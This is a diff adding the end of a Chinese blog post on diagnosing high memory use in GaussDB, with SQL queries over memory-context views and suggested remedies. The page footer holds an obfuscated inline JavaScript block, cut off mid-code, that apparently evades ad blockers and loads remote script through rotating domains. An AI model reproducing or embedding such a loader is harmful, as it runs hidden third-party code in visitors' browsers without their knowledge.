+ StorageTopMemoryContext           <span class="token operator">|</span>  <span class="token number">16.7601776123046875</span> <span class="token operator">|</span> <span class="token number">.04942321777343750000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ GlobalAuditMemory                 <span class="token operator">|</span>  <span class="token number">16.0081176757812500</span> <span class="token operator">|</span> <span class="token number">.00769042968750000000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ CBBTopMemoryContext               <span class="token operator">|</span>  <span class="token number">14.9503479003906250</span> <span class="token operator">|</span> <span class="token number">.04009246826171875000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ Undo                              <span class="token operator">|</span>   <span class="token number">8.6680450439453125</span> <span class="token operator">|</span> <span class="token number">.20516967773437500000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ DoubleWriteContext                <span class="token operator">|</span>   <span class="token number">6.5549163818359375</span> <span class="token operator">|</span> <span class="token number">.02331542968750000000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ ThreadPoolContext                 <span class="token operator">|</span>   <span class="token number">5.3873443603515625</span> <span class="token operator">|</span> <span class="token number">.00525665283203125000</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ GlobalSysDBCacheEntryMemCxt_16384 <span class="token operator">|</span>   <span class="token number">4.3115692138671875</span> <span class="token operator">|</span>    <span class="token number">1.0470581054687500</span> <span class="token operator">|</span>    <span class="token number">16</span> 
+<span class="token punctuation">(</span><span class="token number">10</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>确定内存上下文之后，以IncreCheckPointContext为例，查询视图gs_get_shared_memctx_detail，确定内存堆积的代码位置。</p> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select * from gs_get_shared_memctx_detail('IncreCheckPointContext'); </span>
+          <span class="token keyword">file</span>           <span class="token operator">|</span> line <span class="token operator">|</span>   size 
+<span class="token comment">-------------------------+------+----------- </span>
+ ipci<span class="token punctuation">.</span>cpp                <span class="token operator">|</span>  <span class="token number">476</span> <span class="token operator">|</span>        <span class="token number">64</span> 
+ pagewriter<span class="token punctuation">.</span>cpp          <span class="token operator">|</span>  <span class="token number">298</span> <span class="token operator">|</span>      <span class="token number">1024</span> 
+ ipci<span class="token punctuation">.</span>cpp                <span class="token operator">|</span>  <span class="token number">498</span> <span class="token operator">|</span>      <span class="token number">4096</span> 
+ pagewriter<span class="token punctuation">.</span>cpp          <span class="token operator">|</span>  <span class="token number">322</span> <span class="token operator">|</span>  <span class="token number">19632000</span> 
+ pagewriter<span class="token punctuation">.</span>cpp          <span class="token operator">|</span>  <span class="token number">317</span> <span class="token operator">|</span>  <span class="token number">33669120</span> 
+ storage_buffer_init<span class="token punctuation">.</span>cpp <span class="token operator">|</span>   <span class="token number">90</span> <span class="token operator">|</span> <span class="token number">209756160</span> 
+<span class="token punctuation">(</span><span class="token number">6</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>从上述查询结果可以看出，在代码storage_buffer_init.cpp的90行申请了大量的内存，可能存在内存堆积不释放的问题。</p> 
+<ul><li>无现场环境<br> 若存在内存过载时间节点的内存快照信息，则在内存统计信息中找到Shared Memory Context类型的top20的内存上下文申请详情，即可确认内存堆积的原因。<br> 若不存在内存过载时间节点的内存快照信息，请联系华为工程师定位解决。</li></ul> 
+<p>总结：使用上面2种方法找到内存占用过多的内存上下文后，可进行初步判断，在数据库内核执行业务时，一般占用较多的全局内存上下文有“IncreCheckPointContext”，“DefaultTopMemoryContext”，如果是这两个context占用较多，则需要减小业务的并发来降低内存占用；如果是其他内存上下文，可能是业务执行过程出现内存堆积，请联系华为工程师解决。</p> 
+<ol start="2"><li>线程级内存上下文占用内存较高</li></ol> 
+<ul><li>有现场环境<br> 查询如下语句即可确认是哪个内存上下文占用内存较高。</li></ul> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select contextname, sum(totalsize)/1024/1024 sum, sum(freesize)/1024/1024, count(*) count from pv_thread_memory_context group by contextname order by sum desc limit 10; </span>
+           contextname           <span class="token operator">|</span>         sum          <span class="token operator">|</span>       ?<span class="token keyword">column</span>?        <span class="token operator">|</span> count 
+<span class="token comment">---------------------------------+----------------------+-----------------------+------- </span>
+ LocalSysCacheShareMemoryContext <span class="token operator">|</span> <span class="token number">641.0926513671875000</span> <span class="token operator">|</span>   <span class="token number">60.0820159912109375</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ StorageTopMemoryContext         <span class="token operator">|</span> <span class="token number">311.8157348632812500</span> <span class="token operator">|</span>    <span class="token number">3.1896591186523438</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ LocalSysCacheMyDBMemoryContext  <span class="token operator">|</span> <span class="token number">175.0625000000000000</span> <span class="token operator">|</span>   <span class="token number">65.0446166992187500</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ DefaultTopMemoryContext         <span class="token operator">|</span> <span class="token number">168.5756530761718750</span> <span class="token operator">|</span>   <span class="token number">10.7153015136718750</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ ThreadTopMemoryContext          <span class="token operator">|</span> <span class="token number">161.9752502441406250</span> <span class="token operator">|</span>    <span class="token number">4.1196441650390625</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ CBBTopMemoryContext             <span class="token operator">|</span> <span class="token number">109.1161880493164063</span> <span class="token operator">|</span>    <span class="token number">6.7845993041992188</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ LocalSysCacheTopMemoryContext   <span class="token operator">|</span>  <span class="token number">93.4109802246093750</span> <span class="token operator">|</span>   <span class="token number">13.2236938476562500</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ Timezones                       <span class="token operator">|</span>  <span class="token number">43.2421417236328125</span> <span class="token operator">|</span>    <span class="token number">1.4333953857421875</span> <span class="token operator">|</span>   <span class="token number">543</span> 
+ gs_signal                       <span class="token operator">|</span>  <span class="token number">32.2394561767578125</span> <span class="token operator">|</span>    <span class="token number">4.9155120849609375</span> <span class="token operator">|</span>     <span class="token number">1</span> 
+ <span class="token keyword">Type</span> information cache          <span class="token operator">|</span>  <span class="token number">23.8869018554687500</span> <span class="token operator">|</span> <span class="token number">.90544128417968750000</span> <span class="token operator">|</span>   <span class="token number">343</span> 
+<span class="token punctuation">(</span><span class="token number">10</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>确定内存上下文之后，以StorageTopMemoryContext为例，查询视图gs_get_thread_memctx_detail（第一个入参为线程ID，可以通过查询视图gs_thread_memory_context获得 ），确定内存堆积的代码位置。</p> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select * from gs_get_thread_memctx_detail(140639273547520,'StorageTopMemoryContext'); </span>
+     <span class="token keyword">file</span>     <span class="token operator">|</span> line <span class="token operator">|</span>  size 
+<span class="token comment">--------------+------+-------- </span>
+ syncrep<span class="token punctuation">.</span>cpp  <span class="token operator">|</span> <span class="token number">1608</span> <span class="token operator">|</span>     <span class="token number">32</span> 
+ elog<span class="token punctuation">.</span>cpp     <span class="token operator">|</span> <span class="token number">2008</span> <span class="token operator">|</span>     <span class="token number">16</span> 
+ fd<span class="token punctuation">.</span>cpp       <span class="token operator">|</span> <span class="token number">2734</span> <span class="token operator">|</span>    <span class="token number">128</span> 
+ syncrep<span class="token punctuation">.</span>cpp  <span class="token operator">|</span> <span class="token number">1568</span> <span class="token operator">|</span>     <span class="token number">32</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">175</span> <span class="token operator">|</span>    <span class="token number">512</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">169</span> <span class="token operator">|</span> <span class="token number">342656</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">157</span> <span class="token operator">|</span>  <span class="token number">85664</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">146</span> <span class="token operator">|</span>  <span class="token number">21416</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">144</span> <span class="token operator">|</span>  <span class="token number">32112</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">136</span> <span class="token operator">|</span>  <span class="token number">10712</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">135</span> <span class="token operator">|</span>  <span class="token number">10712</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">128</span> <span class="token operator">|</span>  <span class="token number">85664</span> 
+ deadlock<span class="token punctuation">.</span>cpp <span class="token operator">|</span>  <span class="token number">126</span> <span class="token operator">|</span>  <span class="token number">21416</span> 
+<span class="token punctuation">(</span><span class="token number">13</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>从上述查询结果可以看出，在代码deadlock.cpp的169行申请了大量的内存，可能存在内存堆积不释放的问题。</p> 
+<ul><li>无现场环境<br> 若存在内存过载时间节点的内存快照信息，则在内存统计信息中找到Thread Memory Context类型的top20的内存上下文申请详情，即可确认内存堆积的原因。<br> 若不存在内存过载时间节点的内存快照信息，请联系华为工程师定位解决。</li></ul> 
+<p>总结：使用上面2种方法找到内存占用过多的内存上下文后，可进行初步判断，在数据库内核执行业务时，一般占用较多的全局内存上下文有“LocalSysCacheShareMemoryContext”，“StorageTopMemoryContext”，如果是这两个context占用较多，则需要减小业务的并发来降低内存占用；如果是其他内存上下文，可能是业务执行过程出现内存堆积，请联系华为工程师解决。</p> 
+<ol start="3"><li>session级内存上下文占用内存较高</li></ol> 
+<ul><li>有现场环境<br> 查询如下语句即可确认是哪个内存上下文占用内存较高。</li></ul> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select contextname, sum(totalsize)/1024/1024 sum, sum(freesize)/1024/1024, count(*) count from pv_session_memory_context group by contextname order by sum desc limit 10; </span>
+        contextname         <span class="token operator">|</span>         sum          <span class="token operator">|</span>       ?<span class="token keyword">column</span>?        <span class="token operator">|</span> count 
+<span class="token comment">----------------------------+----------------------+-----------------------+------- </span>
+ CachedPlan                 <span class="token operator">|</span> <span class="token number">226.1093750000000000</span> <span class="token operator">|</span>   <span class="token number">67.1747817993164063</span> <span class="token operator">|</span> <span class="token number">12450</span> 
+ CachedPlanQuery            <span class="token operator">|</span> <span class="token number">134.8027343750000000</span> <span class="token operator">|</span>   <span class="token number">41.8541030883789063</span> <span class="token operator">|</span> <span class="token number">12612</span> 
+ SessionTopMemoryContext    <span class="token operator">|</span> <span class="token number">132.1605682373046875</span> <span class="token operator">|</span>   <span class="token number">26.1002349853515625</span> <span class="token operator">|</span>   <span class="token number">301</span> 
+ CachedPlanSource           <span class="token operator">|</span>  <span class="token number">98.7617187500000000</span> <span class="token operator">|</span>   <span class="token number">28.4135513305664063</span> <span class="token operator">|</span> <span class="token number">12912</span> 
+ CBBTopMemoryContext        <span class="token operator">|</span>  <span class="token number">60.4861373901367188</span> <span class="token operator">|</span>    <span class="token number">3.0370101928710938</span> <span class="token operator">|</span>   <span class="token number">301</span> 
+ Timezones                  <span class="token operator">|</span>  <span class="token number">23.9703216552734375</span> <span class="token operator">|</span> <span class="token number">.79457092285156250000</span> <span class="token operator">|</span>   <span class="token number">301</span> 
+ SPI <span class="token keyword">Plan</span>                   <span class="token operator">|</span>  <span class="token number">21.1307907104492188</span> <span class="token operator">|</span>    <span class="token number">6.8435440063476563</span> <span class="token operator">|</span>  <span class="token number">2412</span> 
+ GenericRoot                <span class="token operator">|</span>  <span class="token number">19.9628906250000000</span> <span class="token operator">|</span>    <span class="token number">7.7032165527343750</span> <span class="token operator">|</span>   <span class="token number">374</span> 
+ Prepared Queries           <span class="token operator">|</span>  <span class="token number">16.4062500000000000</span> <span class="token operator">|</span>    <span class="token number">7.5508117675781250</span> <span class="token operator">|</span>   <span class="token number">300</span> 
+ unnamed prepared statement <span class="token operator">|</span>  <span class="token number">14.3437500000000000</span> <span class="token operator">|</span>    <span class="token number">6.6462554931640625</span> <span class="token operator">|</span>   <span class="token number">300</span> 
+<span class="token punctuation">(</span><span class="token number">10</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>确定内存上下文之后，以CachedPlan为例，查询视图gs_get_session_memctx_detail，确定内存堆积的代码位置。</p> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select * from gs_get_session_memctx_detail('CachedPlanQuery'); </span>
+     <span class="token keyword">file</span>      <span class="token operator">|</span> line <span class="token operator">|</span>  size 
+<span class="token comment">---------------+------+--------- </span>
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2607</span> <span class="token operator">|</span> <span class="token number">5031680</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">7013</span> <span class="token operator">|</span> <span class="token number">4176736</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">7016</span> <span class="token operator">|</span> <span class="token number">2088368</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">5062</span> <span class="token operator">|</span> <span class="token number">6918144</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3461</span> <span class="token operator">|</span>  <span class="token number">403552</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3397</span> <span class="token operator">|</span> <span class="token number">2727104</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3401</span> <span class="token operator">|</span>  <span class="token number">487368</span> 
+ datum<span class="token punctuation">.</span>cpp     <span class="token operator">|</span>  <span class="token number">150</span> <span class="token operator">|</span>    <span class="token number">2048</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2572</span> <span class="token operator">|</span> <span class="token number">1113728</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">6204</span> <span class="token operator">|</span>      <span class="token number">32</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">6206</span> <span class="token operator">|</span>      <span class="token number">32</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">7021</span> <span class="token operator">|</span> <span class="token number">4267200</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">7037</span> <span class="token operator">|</span> <span class="token number">2832000</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">7048</span> <span class="token operator">|</span> <span class="token number">2066400</span> 
+ bitmapset<span class="token punctuation">.</span>cpp <span class="token operator">|</span>   <span class="token number">94</span> <span class="token operator">|</span>  <span class="token number">134400</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3430</span> <span class="token operator">|</span>   <span class="token number">96000</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2847</span> <span class="token operator">|</span> <span class="token number">2150400</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2551</span> <span class="token operator">|</span> <span class="token number">5126400</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3984</span> <span class="token operator">|</span>  <span class="token number">105600</span> 
+ list<span class="token punctuation">.</span>cpp      <span class="token operator">|</span>  <span class="token number">105</span> <span class="token operator">|</span>  <span class="token number">254400</span> 
+ list<span class="token punctuation">.</span>cpp      <span class="token operator">|</span>  <span class="token number">108</span> <span class="token operator">|</span>  <span class="token number">796800</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3835</span> <span class="token operator">|</span> <span class="token number">7065600</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2451</span> <span class="token operator">|</span> <span class="token number">1056000</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2453</span> <span class="token operator">|</span>  <span class="token number">244800</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3840</span> <span class="token operator">|</span>  <span class="token number">230400</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2895</span> <span class="token operator">|</span> <span class="token number">1113600</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3442</span> <span class="token operator">|</span>   <span class="token number">38400</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2645</span> <span class="token operator">|</span>  <span class="token number">115200</span> 
+ list<span class="token punctuation">.</span>cpp      <span class="token operator">|</span>  <span class="token number">166</span> <span class="token operator">|</span>   <span class="token number">19200</span> 
+ namespace<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3853</span> <span class="token operator">|</span>  <span class="token number">144000</span> 
+ list<span class="token punctuation">.</span>cpp      <span class="token operator">|</span> <span class="token number">1460</span> <span class="token operator">|</span>  <span class="token number">288000</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2910</span> <span class="token operator">|</span>   <span class="token number">38400</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2762</span> <span class="token operator">|</span> <span class="token number">1075200</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3953</span> <span class="token operator">|</span>   <span class="token number">67200</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">3000</span> <span class="token operator">|</span>   <span class="token number">96000</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">5876</span> <span class="token operator">|</span>   <span class="token number">28800</span> 
+ copyfuncs<span class="token punctuation">.</span>cpp <span class="token operator">|</span> <span class="token number">2619</span> <span class="token operator">|</span>    <span class="token number">2400</span> 
+<span class="token punctuation">(</span><span class="token number">37</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>从上述查询结果可以看出，在代码copyfuncs.cpp的3835行申请了大量的内存，可能存在内存堆积不释放的问题。</p> 
+<ul><li>无现场环境<br> 若存在内存过载时间节点的内存快照信息，则在内存统计信息中找到Session Memory Context类型的top20的内存上下文申请详情，即可确认内存堆积的原因。<br> 若不存在内存过载时间节点的内存快照信息，请联系华为工程师定位解决。</li></ul> 
+<p>总结：使用上面2种方法找到内存占用过多的内存上下文后，可进行初步判断，在数据库内核执行业务时，一般占用较多的全局内存上下文有“CachedPlan”，“CachedPlanQuery”，“CachedPlanSource”，“SessionTopMemoryContext”，如果是这几个context占用较多，则需要减小业务的并发来降低内存占用；如果是其他内存上下文，可能是业务执行过程出现内存堆积，请联系华为工程师解决。</p> 
+<ol start="4"><li>其他内存占用较高</li></ol> 
+<ul><li>内存碎片过多导致内存缓存过多<br> 数据库执行作业时，数据库内部频繁申请和释放内存如创建大量的cache plan的情况下会造成大量的内存碎片，由于底层内存机制的缘故，这些内存碎片不会被操作系统立即回收，而是缓存起来，数据库在统计的时候会将其计算在other_used_memory里面，如下所示。</li></ul> 
+<pre><code class="prism language-sql">gaussdb<span class="token operator">=</span><span class="token comment"># select * from pv_total_memory_detail; </span>
+ nodename       <span class="token operator">|</span>       memorytype        <span class="token operator">|</span> memorymbytes 
+<span class="token comment">----------------+-------------------------+-------------- </span>
+ coordinator1   <span class="token operator">|</span> max_process_memory      <span class="token operator">|</span>        <span class="token number">81920</span> 
+ coordinator1   <span class="token operator">|</span> process_used_memory     <span class="token operator">|</span>        <span class="token number">24567</span> 
+ coordinator1   <span class="token operator">|</span> max_dynamic_memory      <span class="token operator">|</span>        <span class="token number">34012</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_used_memory     <span class="token operator">|</span>         <span class="token number">1851</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_peak_memory     <span class="token operator">|</span>         <span class="token number">3639</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_used_shrctx     <span class="token operator">|</span>          <span class="token number">394</span> 
+ coordinator1   <span class="token operator">|</span> dynamic_peak_shrctx     <span class="token operator">|</span>          <span class="token number">399</span> 
+ coordinator1   <span class="token operator">|</span> max_backend_memory      <span class="token operator">|</span>          <span class="token number">648</span> 
+ coordinator1   <span class="token operator">|</span> backend_used_memory     <span class="token operator">|</span>            <span class="token number">1</span> 
+ coordinator1   <span class="token operator">|</span> max_shared_memory       <span class="token operator">|</span>        <span class="token number">46747</span> 
+ coordinator1   <span class="token operator">|</span> shared_used_memory      <span class="token operator">|</span>        <span class="token number">11618</span> 
+ coordinator1   <span class="token operator">|</span> max_cstore_memory       <span class="token operator">|</span>          <span class="token number">512</span> 
+ coordinator1   <span class="token operator">|</span> cstore_used_memory      <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> max_sctpcomm_memory     <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> sctpcomm_used_memory    <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> sctpcomm_peak_memory    <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> other_used_memory       <span class="token operator">|</span>         <span class="token number">11013</span> 
+ coordinator1   <span class="token operator">|</span> gpu_max_dynamic_memory  <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> gpu_dynamic_used_memory <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> gpu_dynamic_peak_memory <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> pooler_conn_memory      <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> pooler_freeconn_memory  <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> storage_compress_memory <span class="token operator">|</span>            <span class="token number">0</span> 
+ coordinator1   <span class="token operator">|</span> udf_reserved_memory     <span class="token operator">|</span>            <span class="token number">0</span> 
+<span class="token punctuation">(</span><span class="token number">24</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
+</code></pre> 
+<ul><li>其他原因导致内存未及时释放<br> 此处需要注意：other_used_memory过大不全部都是因为内存碎片导致的，也可能是如下原因：<br> 1). 业务代码中存在没有在内存上下文上申请内存直接使用了malloc接口申请内存的地方，且出现了内存堆积。<br> 2). 第三方开源软件存在内存未及时释放的场景。<br> 出现这两种情况时，需要联系华为工程师协助解决。</li></ul> 
+<h2>
+<a id="3__479"></a>3. 解决方案</h2> 
+<ul>
+<li>内存堆积导致内存满<br> 方案：出现内存堆积长时间不释放时，需要通过做主备切换来降低内存的使用。</li>
+<li>业务原因导致内存满<br> 方案：修改客户端作业，降低并发数或者修改SQL语句，使其在执行时不占用大量内存，请联系华为工程师协助给出详细的解决方案。</li>
+<li>other内存缓存过多导致内存满<br> 方案一：如果是由于业务场景导致的other内存缓存过高，则可以通过调整执行计划相关的参数或者从客户端侧调整业务来解决内存过高的问题，需要根据具体业务场景确定修改方案，请联系华为工程师协助给出详细的解决方案。<br> 方案二：出现内存堆积长时间不释放时，且无法通过调整业务来降低内存时则需要通过做主备切换来降低内存的使用。</li>
+</ul>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0